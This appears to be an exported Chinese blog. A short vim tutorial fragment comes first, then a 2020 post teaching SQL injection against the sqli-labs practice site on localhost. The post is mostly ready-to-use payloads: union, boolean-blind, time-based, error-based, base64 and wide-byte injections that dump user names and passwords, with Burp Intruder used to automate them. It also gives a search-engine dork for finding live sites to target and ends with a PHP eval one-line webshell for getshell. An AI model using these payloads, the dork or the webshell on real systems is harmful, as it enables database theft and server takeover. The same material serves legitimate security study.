<p>输入  <strong>i  进入编辑模式</strong></p>
<p>输入  你想要<strong>输入的内容</strong></p>
<p>按ESC 返回  命令模式，返回之后会把你要输入的内容重复。</p>
<h5 id="利用-可视块-给多行代码增加注释"><a href="#利用-可视块-给多行代码增加注释" class="headerlink" title="利用  可视块  给多行代码增加注释"></a>利用  可视块  给多行代码增加注释</h5><p>在 Python  中 ，要给代码增加注释，可以在代码前增加一个 #</p>
<p>要实现这个效果可以在  命令模式 下</p>
<ol>
<li>移动到要添加注释的 第一行代码 ， 按^来到行首</li>
<li>按Ctrl+v 进入 可视块 模式</li>
<li>使用 j 向下连续选中要添加的代码行</li>
<li>输入  I  进入 编辑模式，并在 行首插入，注意：一定要使用I</li>
<li>输入 # 也就是注释号</li>
<li>按下  ESC  返回到   命令模式，返回之后 vi  会在之前选中的每一行代码前插入 #</li>
</ol>
<h3 id="0-5分屏命令"><a href="#0-5分屏命令" class="headerlink" title="0.5分屏命令"></a>0.5分屏命令</h3><h4 id="5-1末行命令扩展"><a href="#5-1末行命令扩展" class="headerlink" title="5.1末行命令扩展"></a>5.1末行命令扩展</h4><table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>:e .</strong></td>
<td><strong>edit</strong></td>
<td><strong>会打开内置的文件浏览器，浏览要当前目录下的文件</strong></td>
</tr>
<tr>
<td><strong>:n 文件名</strong></td>
<td><strong>new</strong></td>
<td><strong>新建文件</strong></td>
</tr>
<tr>
<td><strong>:w 文件名</strong></td>
<td><strong>write</strong></td>
<td><strong>另存为，但是仍然编辑当前文件，并不会切换文件</strong></td>
</tr>
</tbody></table>
<p>*<em>:w  命令  如果要阶段性备份的话就可以使用  : w   命令 *</em></p>
<blockquote>
<p>切换文件之前，必须保证当前这个文件已经被保存！</p>
</blockquote>
<p>学习过的  <strong>末行命令：</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>:w</td>
<td>write</td>
<td>保存</td>
</tr>
<tr>
<td>:q</td>
<td>quit</td>
<td>退出，如果没有保存不允许退出</td>
</tr>
<tr>
<td>:q!</td>
<td>quit</td>
<td>强行退出，不保存退出</td>
</tr>
<tr>
<td>:wq</td>
<td>write&amp;quit</td>
<td>保存并退出</td>
</tr>
<tr>
<td>:x</td>
<td></td>
<td>保存并退出</td>
</tr>
<tr>
<td>:%s///gc</td>
<td></td>
<td>确认搜索并替换</td>
</tr>
</tbody></table>
<h4 id="5-2-分屏命令"><a href="#5-2-分屏命令" class="headerlink" title="5.2 分屏命令"></a>5.2 分屏命令</h4><ul>
<li>使用 <strong>分屏命令</strong>，可以  <strong>同时编辑和查看多个文件</strong></li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>:sp[文件名]</td>
<td>splip</td>
<td>横向增加分屏</td>
</tr>
<tr>
<td>:vsp[文件名]</td>
<td>vertical split</td>
<td>纵向增加分屏</td>
</tr>
</tbody></table>
<h5 id="1）切换分屏窗口"><a href="#1）切换分屏窗口" class="headerlink" title="1）切换分屏窗口"></a>1）切换分屏窗口</h5><blockquote>
<p>分屏窗口都是基于Ctrl+W这个快捷键的，W对应的英文单词是window</p>
</blockquote>
<table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>W</strong></td>
<td><strong>window</strong></td>
<td><strong>切换到下一个窗口</strong></td>
</tr>
<tr>
<td><strong>r</strong></td>
<td><strong>reverse</strong></td>
<td><strong>互换窗口</strong></td>
</tr>
<tr>
<td><strong>c</strong></td>
<td><strong>close</strong></td>
<td><strong>关闭当前窗口，但是不能关闭最后一个窗口</strong></td>
</tr>
<tr>
<td><strong>q</strong></td>
<td><strong>quit</strong></td>
<td><strong>退出当前窗口，如果是最后一个窗口，则关闭vi</strong></td>
</tr>
<tr>
<td><strong>o</strong></td>
<td><strong>other</strong></td>
<td><strong>关闭其他窗口</strong></td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2020/04/03/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h4><p>SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过构造不同的sql语句来实现对数据库的任意操作</p>
<h4 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h4><p>SQL注入的而产生的需要满足两个条件：</p>
<ul>
<li>参数用户可控：前端传给后端的参数内容是用户可以控制的</li>
<li>参数代入数据库查询：传入的参数拼接到SQL语句查询，且带入数据库查询</li>
</ul>
<h5 id="当传入的参数为1’时-数据库执行代码如下"><a href="#当传入的参数为1’时-数据库执行代码如下" class="headerlink" title="当传入的参数为1’时,数据库执行代码如下"></a>当传入的参数为1’时,数据库执行代码如下</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>

<h5 id="这不符合数据库语法规范，所以会报错，传入参数and-1-1时，执行的SQL语句如下"><a href="#这不符合数据库语法规范，所以会报错，传入参数and-1-1时，执行的SQL语句如下" class="headerlink" title="这不符合数据库语法规范，所以会报错，传入参数and 1=1时，执行的SQL语句如下"></a>这不符合数据库语法规范，所以会报错，传入参数and 1=1时，执行的SQL语句如下</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>

<p>因为1=1为真，where语句中id=1也为真，页面返回与id=1相同的结果。当传入参数and 1=2 时，1=2不成立，返回与id=1不同的结果。由此可以判断ID参数存在sql注入。</p>
<h4 id="SQL注入相关知识"><a href="#SQL注入相关知识" class="headerlink" title="SQL注入相关知识"></a>SQL注入相关知识</h4><p>在mysql5.0版本后，默认在数据库有一个information_schema的库，要记住其中三个表名，</p>
<p>分别是SCHEMATA(schemata)、TABLES(tables)、COLUMNS(columns)。</p>
<ul>
<li><strong>SCHEMATA</strong>表存储该用户创建的所有数据库的<strong>库名</strong>，该表中记录<strong>数据库字段</strong>的名为<strong>SCHEMA_NAME(schema_name)</strong></li>
<li><strong>TABLES</strong>表存储该用户创建的所有数据库的<strong>库名</strong>和<strong>表名</strong>，该表中记录数据库<strong>库名</strong>和<strong>表名</strong>的字段，分别为<strong>TABLE_SHCEMA(table_schema)</strong>和<strong>TABLE_NAME(table_name)</strong></li>
<li><strong>COLUMNS</strong>表存储该用户创建的所有数据库的<strong>库名、表名</strong>和<strong>字段名</strong>，该表中记录数据库<strong>库名、表名和字段名</strong>的字段为，<strong>TABLE_SCHEMA(table_schema)、TABLE_NAME(table_name)、COLUMN_NAME(column_name)</strong></li>
</ul>
<h4 id="需要记住的几个函数"><a href="#需要记住的几个函数" class="headerlink" title="需要记住的几个函数"></a>需要记住的几个函数</h4><ul>
<li><h5 id="database-查看当前数据库"><a href="#database-查看当前数据库" class="headerlink" title="database()查看当前数据库"></a>database()查看当前数据库</h5></li>
<li><h5 id="version-查看当前版本"><a href="#version-查看当前版本" class="headerlink" title="version()查看当前版本"></a>version()查看当前版本</h5></li>
<li><h5 id="user-查看当前用户"><a href="#user-查看当前用户" class="headerlink" title="user()查看当前用户"></a>user()查看当前用户</h5></li>
</ul>
<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>MySQL中常见注释符的表达方式：#–空格或/* */</p>
<h3 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h3><h5 id="Union注入也叫联合注入"><a href="#Union注入也叫联合注入" class="headerlink" title="Union注入也叫联合注入"></a>Union注入也叫联合注入</h5><p><a href="http://127.0.0.1/Less-1/?id=1测试地址" target="_blank" rel="noopener">http://127.0.0.1/Less-1/?id=1测试地址</a></p>
<h5 id="测试当前页面出错信息"><a href="#测试当前页面出错信息" class="headerlink" title="测试当前页面出错信息"></a>测试当前页面出错信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当1&#x3D;1的时候为真返回正确页面</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">但1&#x3D;2时返回还是正确页面，</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;2&#39;</span><br><span class="line"></span><br><span class="line">所以可以尝试在id&#x3D;1后面加上单引号&#39; ，id&#x3D;1&#39;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39;</span><br><span class="line">这里报错了，说明存在注入点</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897216762.png" alt="1583897216762"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用order by 查询字段数，因为使用单引号了&#39; 所以要用注释符注释一下，我们这里可以用# 也可以用--+</span><br><span class="line">其中%23代表#井号</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4%23</span><br><span class="line"></span><br><span class="line">我们发现出错了，说没有4这个列</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897341992.png" alt="1583897341992"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里我们尝试一下3看看有没有这个列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3%23</span><br><span class="line"></span><br><span class="line">页面返回正常，说明字段数是3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897462676.png" alt="1583897462676"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们这里使用联合查询，查看一下当前版本和库名</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,3%23</span><br><span class="line"></span><br><span class="line">这里返回了2和3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897552384.png" alt="1583897552384"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们可以在2和3的字段上查询一下库名和版本号</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,version(),database()%23</span><br><span class="line"></span><br><span class="line">版本号是5.5.53，当前库名是security</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897631314.png" alt="1583897631314"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们知道了版本号和当前库名之后就要进行查询当前库中的表，因为当前版本是5.0以上所以数据库中有information_schema这个库，我们来查询一下</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br><span class="line"></span><br><span class="line">这里我们查看了当前security下的表</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897798516.png" alt="1583897798516"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在大部分情况下用户的用用户名和密码都在users表中，我们来查看一下users表</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+</span><br><span class="line"></span><br><span class="line">发现有id，username，password，这些正是我们想要的</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905097676.png" alt="1583905097676"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看id，username，password字段的数据</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(id,username,password) from users--+</span><br><span class="line"></span><br><span class="line">这样我们想要的数据就查询出来了</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905244735.png" alt="1583905244735"></p>
<h3 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h3><h5 id="布尔注入，也叫盲注，"><a href="#布尔注入，也叫盲注，" class="headerlink" title="布尔注入，也叫盲注，"></a>布尔注入，也叫盲注，</h5><h5 id="这是我们的初始页面"><a href="#这是我们的初始页面" class="headerlink" title="这是我们的初始页面"></a>这是我们的初始页面</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905377875.png" alt="1583905377875"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先测试页面报错信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39;</span><br><span class="line">这里使用单引号出错了，加上注释符返回成功页面如下。</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905447719.png" alt="1583905447719"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905503272.png" alt="1583905503272"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为页面不能返回数据库的信息，所以我们要使用布尔盲注来进行注入</span><br><span class="line">首先要查询当前数据库的长度，在布尔注入中要用and来连接</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;9--+</span><br><span class="line">我们这里输入9发现错误，并没有返回You are in，我们输入8试一下。</span><br><span class="line">我们输入8之后页面返回乐乐You are in 说明当前数据库长度为8</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905634367.png" alt="1583905634367"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905687105.png" alt="1583905687105"></p>
<p>知道数据库的长度了我们就要注入出数据库的名称，因为盲注不适用工具的情况下只能手动一个一个尝试，效率太慢，我们用Burp Suite进行抓包，自动筛选。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断库名，我们这里用ascii码来跑，ascii码有上下限，从0-127，等号后面要跟数字，不能跟字母，当然也可以不用ascii吗，substr然后等号后面跟字符串</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; and ascii(substr(database(),1,1))&#x3D;101--+</span><br><span class="line"></span><br><span class="line">我们这两将GET请求发送到 intruder模块下</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583906874787.png" alt="1583906874787"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">现将1的位置clear$掉，然后选中101进行Add$</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583906926421.png" alt="1583906926421"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">现在intruder下的payloads在payload type选择Numbers</span><br><span class="line">起始值从0开始结束值到127每次运行间隔1，点击右上角的Start attack，去百度搜索一张ASCII码表，等一下对照</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583906434633.png" alt="1583906434633"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们发现115是s，使用相同手法只需要每次更改database()后面的1的值就行</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583907052698.png" alt="1583907043000"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583907307105.png" alt="1583907052698"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里我们已经知道他的库名是security，我们要查询表名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101--+</span><br><span class="line">然后继续抓包进行自动扫描</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583908711931.png" alt="1583907307105"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里ascii是101我们对照上面的ascii码发现是e按照之前相同步骤我们这里查询出了emails、referers、uagents、users四个表</span><br><span class="line">说明：查看第一个表名更改，1,1的值，想要查询下一个表名更改limit的值，limit是从0开始，1,1是从1开始</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583907737457.png" alt="1583907737457"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询出了表我们查询字段，查看users的字段</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583908847437.png" alt="1583908711931"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们看到结果是105对应ascii码是i，使用相同步骤继续查询，最后得出</span><br><span class="line">id，username，password字段</span><br><span class="line"></span><br><span class="line">查询字段数据和union一样将from后的删掉加上该加的然后查询表数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select (id) from users limit 0,1),1,1))&#x3D;49--+</span><br><span class="line"></span><br><span class="line">还有个时间注入效率非常慢，能不用时间注入就不用,</span><br><span class="line">这里演示的是查询他的库名，表名和字段名跟union一样</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583917097717.png" alt="1583908847437"></p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>什么时候需要报错注入</p>
<p>在实际场景中，如果没有一个合适的数据返回点，而是仅仅带入sql数据库查询，就需要报错注入</p>
<p>SELECT * FROM users WHERE id=’$id’ LIMIT 0,1 正常进行绕过，但是在Less-5没有数据回显，断定为报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、updatexml</span><br><span class="line">0x7e编码是~的解码形式，可以理解为，让后台xml故意报错</span><br><span class="line">concat就是排序</span><br><span class="line">这是查看当前数据库</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line">进一步获取表名，列名，数据。。。</span><br><span class="line">在报错注入的情况下不能使用union select，只能使用select来查询语句</span><br><span class="line"> </span><br><span class="line">之前用union获取表名</span><br><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schem&#x3D;&#39;security&#39;</span><br><span class="line"></span><br><span class="line">报错注入</span><br><span class="line">and undatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;seurity&#39; limit 0,1),0x7e),1)</span><br><span class="line">因为使用了limit如果数据库内容少的话可以手动一个一个加，但是如果数据库有几百条的话，就不能手动加了，效率太慢，可以使用burp，抓包发送的intruder模块然后$clear清除，将limit第一个值$add一下，选择Payload模块里面的Number设置值，进行攻击</span><br><span class="line"></span><br><span class="line">2、extractvalue</span><br><span class="line">对数据库让他进行一个xml文档的故意报错</span><br><span class="line">利用这种方式面对后台进行一个排序，指定第一个参数为null，让他故意报错，将第二个参数的语句带入数据库执行</span><br><span class="line">and extractvalue(null,concat(0x7e,(select database()),0x7e))</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584148581365.png" alt="1583917097717"></p>
<h3 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h3><p>很多情况下，网站管理员会对传进的参数进行一个加密的操作，加密很可能自己写，也有可能base64，md5等，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在百度搜索以下代码之后会出现一些网址，随便进一个就行</span><br><span class="line">inurl:Mw&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">划横线的地方就是典型的base64编码，我们将这一小段代码复制，然后用转换公爵转换一下</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584149885333.png" alt="1584148581365"></p>
<h4 id="发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果"><a href="#发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果" class="headerlink" title="发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果"></a>发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584148714349.png" alt="1584148714349"></p>
<h5 id="这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他-id的位置加上base64-decoder-然后将GET请求放到这个函数中，保存"><a href="#这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他-id的位置加上base64-decoder-然后将GET请求放到这个函数中，保存" class="headerlink" title="这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他$id的位置加上base64_decoder()然后将GET请求放到这个函数中，保存"></a>这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他$id的位置加上base64_decoder()然后将GET请求放到这个函数中，保存</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584149801524.png" alt="1584149801524"></p>
<h5 id="打开sqli-labs还是传入-id-1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码"><a href="#打开sqli-labs还是传入-id-1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码" class="headerlink" title="打开sqli-labs还是传入?id=1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码"></a>打开sqli-labs还是传入?id=1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584150737096.png" alt="1584149885333"></p>
<h5 id="这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出"><a href="#这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出" class="headerlink" title="这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出"></a>这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583983173037.png" alt="1584150737096"></p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>在很多情况下，’为了安全经常会替换成/‘符号进入后台</p>
<p>当输入id=1’加上单引号的时候会爆出一个反斜杠的错误，这样，我们传入的单引号被转义了，无法逃逸单引号的包围，一般情况下是不存在SQL注入漏洞的，不过有一个特例就是当数据库的编码为GBK编码时，可以使用宽字节注入。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583918413567.png" alt="1583917392652"></p>
<p>%df是β的URL编码</p>
<p>宽字节的格式是在地址后面加一个<strong>%df</strong>再加<strong>单引号</strong>，因为反斜杠的编码是<strong>%5c</strong>而在GBK中%df%5c是繁体字連，所以这个时候单引号成功逃逸，报出mysql 的错误</p>
<p>之后的查询跟union一样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里查看的是表名，</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583982481280.png" alt="1583918413567"></p>
<h3 id="跨库注入"><a href="#跨库注入" class="headerlink" title="跨库注入"></a>跨库注入</h3><p>如果要应用跨库注入，有<strong>一个条件</strong>，那就是当前数据库用户为<strong>root用户</strong>，才可以<strong>对整个数据库进行操作</strong></p>
<h5 id="确定用户：user-确定用户-如果回显root-localhost或者root-127-0-0-1只要-前面是root那就是root用户"><a href="#确定用户：user-确定用户-如果回显root-localhost或者root-127-0-0-1只要-前面是root那就是root用户" class="headerlink" title="确定用户：user()    确定用户    如果回显root@localhost或者root@127.0.0.1只要@前面是root那就是root用户"></a>确定用户：user()    确定用户    如果回显root@localhost或者<a href="mailto:root@127.0.0.1">root@127.0.0.1</a>只要@前面是root那就是root用户</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">跟union查询一样，先获取字段，然后再返回数字位置查看当前用户</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,user()--+ </span><br><span class="line">因为@前是root，所以我们可以进行一个跨库注入</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583983833758.png" alt="1583982481280"></p>
<h4 id="获取数据库过程："><a href="#获取数据库过程：" class="headerlink" title="获取数据库过程："></a>获取数据库过程：</h4><h5 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h5><h5 id="获取当前所有数据库"><a href="#获取当前所有数据库" class="headerlink" title="获取当前所有数据库"></a>获取当前所有数据库</h5><h5 id="存有所有数据库的表名为：-information-schema-schemata-存储所有数据库"><a href="#存有所有数据库的表名为：-information-schema-schemata-存储所有数据库" class="headerlink" title="存有所有数据库的表名为：    information_schema.schemata    存储所有数据库"></a>存有所有数据库的表名为：    information_schema.schemata    存储所有数据库</h5><h5 id="schema-name-获取数据库名"><a href="#schema-name-获取数据库名" class="headerlink" title="schema_name        获取数据库名"></a>schema_name        获取数据库名</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583985321796.png" alt="1583983173037"></p>
<h5 id="这里我们获取myemployees库里的表"><a href="#这里我们获取myemployees库里的表" class="headerlink" title="这里我们获取myemployees库里的表"></a>这里我们获取myemployees库里的表</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;myemployees&#39;--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583998370760.png" alt="1583983833758"></p>
<h5 id="获取当前字段"><a href="#获取当前字段" class="headerlink" title="获取当前字段"></a>获取当前字段</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;employees&#39; and table_schema&#x3D;&#39;myemployees&#39;--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583985119530.png" alt="1583985119530"></p>
<h5 id="获取department表的数据"><a href="#获取department表的数据" class="headerlink" title="获取department表的数据"></a>获取department表的数据</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(location_id) from myemployees.departments--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062638658.png" alt="1583985321796"></p>
<p>跨库注入和普通注入的区别</p>
<p>跨库注入首先要获取所有数据库名称</p>
<p>在查询表名，字段名，必须限定你的要注入的数据库名称</p>
<h4 id="mysql高权限用户注入"><a href="#mysql高权限用户注入" class="headerlink" title="mysql高权限用户注入"></a>mysql高权限用户注入</h4><p>getshell</p>
<h5 id="mysql注入高权限文件操作"><a href="#mysql注入高权限文件操作" class="headerlink" title="mysql注入高权限文件操作"></a>mysql注入高权限文件操作</h5><h5 id="目的：发现了注入点，还想进一步渗透，写入文件来getshell"><a href="#目的：发现了注入点，还想进一步渗透，写入文件来getshell" class="headerlink" title="目的：发现了注入点，还想进一步渗透，写入文件来getshell"></a>目的：发现了注入点，还想进一步渗透，写入文件来getshell</h5><p>写入PHP EVAL 一句话木马</p>
<?php eval($_POST["pass"])?>

<p>写入php一句木马有一个前提：我们的木马必须被mysql允许上传，设置secure_file_priv=为空</p>
